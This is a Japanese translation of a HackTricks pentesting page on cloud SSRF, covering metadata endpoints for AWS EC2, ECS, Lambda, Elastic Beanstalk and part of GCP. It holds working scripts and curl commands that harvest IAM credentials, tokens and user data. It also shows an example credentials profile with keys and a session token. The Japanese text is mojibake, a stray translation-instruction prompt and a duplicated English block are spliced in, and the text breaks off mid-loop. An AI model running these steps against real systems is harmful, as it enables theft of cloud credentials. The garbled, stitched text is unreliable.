# ã‚¯ãƒ©ã‚¦ãƒ‰SSRF

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## AWS

### AWS EC2ç’°å¢ƒã§ã®SSRFã®æ‚ªç”¨

**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€EC2ãƒã‚·ãƒ³å†…ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã§ãã€ãã‚Œã«é–¢ã™ã‚‹èˆˆå‘³æ·±ã„æƒ…å ±ã‚’æä¾›ã—ã¾ã™ã€‚URLã¯`http://169.254.169.254`ã§ã™ï¼ˆ[ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«é–¢ã™ã‚‹æƒ…å ±ã¯ã“ã¡ã‚‰](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)ï¼‰ã€‚

ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã¯**2ã¤ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ãŒã‚ã‚Šã¾ã™ã€‚**æœ€åˆã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã§ã¯ã€**GET**ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼ˆã—ãŸãŒã£ã¦ã€**SSRFãŒæ‚ªç”¨ã§ãã¾ã™**ï¼‰ã€‚**ãƒãƒ¼ã‚¸ãƒ§ãƒ³2**ã®[IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)ã§ã¯ã€**HTTPãƒ˜ãƒƒãƒ€**ã‚’é€ä¿¡ã—ã¦**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’è¦æ±‚ã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦åˆ¥ã®HTTPãƒ˜ãƒƒãƒ€ã§ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã—ãŸãŒã£ã¦ã€SSRFã§ã®æ‚ªç”¨ã¯**ã‚ˆã‚Šè¤‡é›‘**ã«ãªã‚Šã¾ã™ï¼‰ã€‚

**ãƒãƒ¼ã‚¸ãƒ§ãƒ³2**ã§ã¯ã€**TTLã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§1ã§ã™**ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€è¨­å®šãŒèª¤ã£ã¦ã„ã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ï¼ˆãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã€NATãƒ‡ãƒã‚¤ã‚¹ã€ãƒ«ãƒ¼ã‚¿ãƒ¼ãªã©ï¼‰ã¯ãƒ‘ã‚±ãƒƒãƒˆã‚’è»¢é€ã—ã¾ã›ã‚“ã€‚ã“ã‚Œã¯ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚­ãƒ³ã‚°æ§‹æˆï¼ˆãƒ–ãƒªãƒƒã‚¸ãƒ¢ãƒ¼ãƒ‰ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹**Dockerã‚³ãƒ³ãƒ†ãƒŠ**ãŒã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚\
**IMDSv2**ã¯ã€`X-Forwarded-For`ãƒ˜ãƒƒãƒ€ã‚’å«ã‚€ãƒˆãƒ¼ã‚¯ãƒ³ã®å–å¾—ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€è¨­å®šãŒèª¤ã£ã¦ã„ã‚‹ãƒªãƒãƒ¼ã‚¹ãƒ—ãƒ­ã‚­ã‚·ã‹ã‚‰ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’é˜²ããŸã‚ã§ã™ã€‚

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«é–¢ã™ã‚‹æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html)ã€‚æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã¯ã€ãã‚Œã‹ã‚‰èˆˆå‘³æ·±ã„æƒ…å ±ãŒå–å¾—ã•ã‚Œã¾ã™ï¼š
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
aws_req="wget -q -O - -H '$HEADER'"
else
echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
echo "Mac: $mac"
printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
echo "Role: $role"
eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
ä»¥ä¸‹ã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®æŠ€è¡“ã«é–¢ã™ã‚‹æœ¬ã®å†…å®¹ã§ã™ã€‚æ¬¡ã®å†…å®¹ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«/hive/hacktricks/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.mdã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±æ–‡ã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ç¿»è¨³ã‚’è¿”ã—ã€ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã¨HTMLã®æ§‹æ–‡ã‚’æ­£ç¢ºã«ä¿ã¡ã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã®åå‰ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®è¨€è‘‰ã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®åå‰ï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ãªã©ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã®æ§‹æ–‡ä»¥å¤–ã®è¿½åŠ ã®ã‚‚ã®ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚

```markdown
As a **publicly available IAM credentials** exposed example you can visit: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

You can also check public **EC2 security credentials** in: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

You can then take **those credentials and use them with the AWS CLI**. This will allow you to do **anything that role has permissions** to do.

To take advantage of the new credentials, you will need to crate a new AWS profile like this one:
```

```markdown
å…¬é–‹ã•ã‚Œã¦ã„ã‚‹IAMè³‡æ ¼æƒ…å ±ã®ä¾‹ã¨ã—ã¦ã€æ¬¡ã®URLã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼š[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

ã¾ãŸã€æ¬¡ã®URLã§å…¬é–‹ã•ã‚Œã¦ã„ã‚‹EC2ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è³‡æ ¼æƒ…å ±ã‚’ç¢ºèªã§ãã¾ã™ï¼š[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

æ¬¡ã«ã€ã“ã‚Œã‚‰ã®è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦AWS CLIã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãã®å½¹å‰²ãŒè¨±å¯ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’**ä½•ã§ã‚‚å®Ÿè¡Œ**ã§ãã¾ã™ã€‚

æ–°ã—ã„è³‡æ ¼æƒ…å ±ã‚’æ´»ç”¨ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªæ–°ã—ã„AWSãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```
```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
**aws\_session\_token**ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‹•ä½œã™ã‚‹ãŸã‚ã«å¿…è¦ä¸å¯æ¬ ã§ã™ã€‚

[**PACU**](https://github.com/RhinoSecurityLabs/pacu)ã¯ã€ç™ºè¦‹ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ç‰¹æ¨©ã‚’èª¿ã¹ã€ç‰¹æ¨©ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è©¦ã¿ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### AWS ECSï¼ˆã‚³ãƒ³ãƒ†ãƒŠã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã®èªè¨¼æƒ…å ±ã«ãŠã‘ã‚‹SSRF

**ECS**ã¯ã€è‡ªåˆ†è‡ªèº«ã®ã‚¯ãƒ©ã‚¹ã‚¿ç®¡ç†ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚¹ã‚±ãƒ¼ãƒ«ã™ã‚‹ã“ã¨ãªãã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®è«–ç†çš„ãªã‚°ãƒ«ãƒ¼ãƒ—ã§ã™ã€‚ã‚‚ã—**ECS**ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒå¤‰æ›´**ã•ã‚Œã¾ã™ã€‚

_**http://169.254.170.2/v2/credentials/\<GUID>**_ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ECSãƒã‚·ãƒ³ã®èªè¨¼æƒ…å ±ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚ãŸã ã—ã€ã¾ãšã¯ **\<GUID>** ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\<GUID>ã‚’è¦‹ã¤ã‘ã‚‹ã«ã¯ã€ãƒã‚·ãƒ³å†…ã® **environ** å¤‰æ•° **AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI** ã‚’èª­ã¿å–ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
`file:///proc/self/environ` ã¸ã® **Path Traversal** ã‚’æ‚ªç”¨ã—ã¦èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
è¨€åŠã•ã‚ŒãŸhttpã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã€**AccessKeyã€SecretKeyã€ãŠã‚ˆã³ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’æä¾›ã—ã¾ã™ã€‚
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
{% hint style="info" %}
ã„ãã¤ã‹ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰EC2ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼ˆå‰è¿°ã®IMDSv2 TTLã®åˆ¶é™ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ã€‚ã“ã‚Œã‚‰ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã‚³ãƒ³ãƒ†ãƒŠIAMãƒ­ãƒ¼ãƒ«ã¨EC2 IAMãƒ­ãƒ¼ãƒ«ã®ä¸¡æ–¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
{% endhint %}

### AWS Lambdaã®SSRF <a href="#6f97" id="6f97"></a>

ã“ã®å ´åˆã€**ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã¯ç’°å¢ƒå¤‰æ•°ã«ä¿å­˜**ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãã‚Œã‚‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€**`file:///proc/self/environ`**ã®ã‚ˆã†ãªã‚‚ã®ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

èˆˆå‘³æ·±ã„ç’°å¢ƒå¤‰æ•°ã®**åå‰**ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

ã•ã‚‰ã«ã€IAMã®ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã«åŠ ãˆã¦ã€Lambdaé–¢æ•°ã«ã¯é–¢æ•°ãŒé–‹å§‹ã•ã‚Œã‚‹ã¨ãã«é–¢æ•°ã«æ¸¡ã•ã‚Œã‚‹**ã‚¤ãƒ™ãƒ³ãƒˆãƒ‡ãƒ¼ã‚¿**ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ‡ãƒ¼ã‚¿ã¯ã€[ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html)ã‚’ä»‹ã—ã¦é–¢æ•°ã«æä¾›ã•ã‚Œã€**stageVariables**å†…ã®ã‚ˆã†ãª**æ©Ÿå¯†æƒ…å ±**ã‚’å«ã‚€ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚IAMã®ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã¨ã¯ç•°ãªã‚Šã€ã“ã®ãƒ‡ãƒ¼ã‚¿ã¯**`http://localhost:9001/2018-06-01/runtime/invocation/next`**ã§æ¨™æº–ã®SSRFçµŒç”±ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

{% hint style="warning" %}
Lambdaã®ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã¯ç’°å¢ƒå¤‰æ•°ã«å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€Lambdaã‚³ãƒ¼ãƒ‰ã®ã‚¹ã‚¿ãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹ãŒç’°å¢ƒå¤‰æ•°ã‚’å‡ºåŠ›ã™ã‚‹å ´åˆã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™ã“ã¨ã§ãã‚Œã‚‰ã‚’**å¤–éƒ¨ã«æ¼æ´©**ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
{% endhint %}

### AWS Elastic Beanstalkã®SSRF URL <a href="#6f97" id="6f97"></a>

APIã‹ã‚‰`accountId`ã¨`region`ã‚’å–å¾—ã—ã¾ã™ã€‚
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
æ¬¡ã«ã€APIã‹ã‚‰`AccessKeyId`ã€`SecretAccessKey`ã€ãŠã‚ˆã³`Token`ã‚’å–å¾—ã—ã¾ã™ã€‚
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

æ¬¡ã«ã€`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`ã‚’ä½¿ç”¨ã—ã¦è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

## GCP <a href="#6440" id="6440"></a>

[**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«é–¢ã™ã‚‹ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã“ã¡ã‚‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)ã€‚

### Google Cloudã®SSRF URL <a href="#6440" id="6440"></a>

ãƒ˜ãƒƒãƒ€ãƒ¼ "Metadata-Flavor: Google"ã¾ãŸã¯ "X-Google-Metadata-Request: True"ãŒå¿…è¦ã§ã€æ¬¡ã®URLã§ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼š

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼š
```bash
# /project
# Project name and number
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -H "X-Google-Metadata-Request: True" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
